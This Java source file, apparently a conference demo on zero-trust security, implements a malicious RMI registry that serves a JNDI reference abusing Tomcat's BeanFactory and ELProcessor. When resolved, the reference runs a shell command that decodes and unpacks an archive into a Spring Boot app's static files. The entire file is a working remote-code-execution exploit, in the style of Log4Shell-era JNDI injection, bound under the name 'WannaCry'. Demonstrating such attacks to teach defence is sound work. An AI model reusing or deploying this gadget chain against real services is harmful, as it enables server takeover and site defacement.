package knativecon2023.zerotrust;

import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

public class RmiServer {

    // Simple exploit that extracts a base64 encode tar archived into the place where the static files are served
    // from a spring boot app. "split()" is used to create a string arrays with the ELProcessor
    private static final String EXPLOIT_FORMAT = "Runtime.getRuntime().exec(\"/bin/sh;-c;echo \\\"%s\\\" | base64 -d | tar zxvf -\".split(\";\")).waitFor()";
    private String getExploit() throws IOException {
        Path path = FileSystems.getDefault().getPath("site.tgz.base64");
        String content = new String(Files.readAllBytes(path));
        return String.format(EXPLOIT_FORMAT,content);
    }

    private ReferenceWrapper wannaCry() throws IOException, NamingException {
        // Setup JNDI references. Note, that the referenced BeanFactory must be available as class
        // at the target host.
        ResourceRef ref =
            new ResourceRef("javax.el.ELProcessor", null, "", "",
                            true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", getExploit()));
        return new ReferenceWrapper(ref);
    }

    public static void main(String[] args) throws IOException, NamingException, AlreadyBoundException {
        System.out.println("Creating evil RMI registry on port 1099");
        Registry registry = LocateRegistry.createRegistry(1099);

        RmiServer rmiServer = new RmiServer();
        System.out.println("Bind remote exploit to 'WannaCry'");
        registry.bind("WannaCry", rmiServer.wannaCry());
    }
}
